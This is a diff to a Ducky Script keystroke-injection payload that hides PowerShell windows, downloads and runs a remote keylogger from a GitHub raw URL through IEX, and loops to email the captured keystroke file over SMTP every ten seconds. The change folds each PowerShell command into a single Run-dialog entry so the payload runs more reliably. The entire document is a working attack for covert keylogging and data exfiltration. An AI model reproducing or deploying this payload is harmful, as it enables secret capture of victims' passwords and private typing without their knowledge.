@@ -1,18 +1,11 @@
 DELAY 500
 GUI r
 DELAY 50
-STRING powershell -WindowStyle hidden
-ENTER
-DELAY 100
-STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PandaPoodle/keylogger/refs/heads/main/Keylogg.txt')
-DELAY 300
+STRING powershell -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PandaPoodle/keylogger/refs/heads/main/Keylogg.txt')
 ENTER
 DELAY 500
 GUI r
-DELAY 50
-STRING powershell -WindowStyle hidden 
-ENTER
 DELAY 100
-STRING while ($true) { $EmailTo = "Recieving Email"; $EmailFrom = "Sender Email"; $Subject = "Test"; $Body = Get-Content -Path C:\Windows1\keylogger.txt; $SMTPServer = "SMTP Server email is using"; $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body); $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPClient.EnableSsl = $true; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("Sending Email", "Sending Email Password"); $SMTPClient.Send($SMTPMessage); Start-Sleep -Seconds 10 }
+STRING powershell -WindowStyle hidden while ($true) { $EmailTo = "Recieving Email"; $EmailFrom = "Sender Email"; $Subject = "Test"; $Body = Get-Content -Path C:\Windows1\keylogger.txt; $SMTPServer = "SMTP Server email is using"; $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body); $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPClient.EnableSsl = $true; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("Sending Email", "Sending Email Password"); $SMTPClient.Send($SMTPMessage); Start-Sleep -Seconds 10 }
 DELAY 300
 ENTER
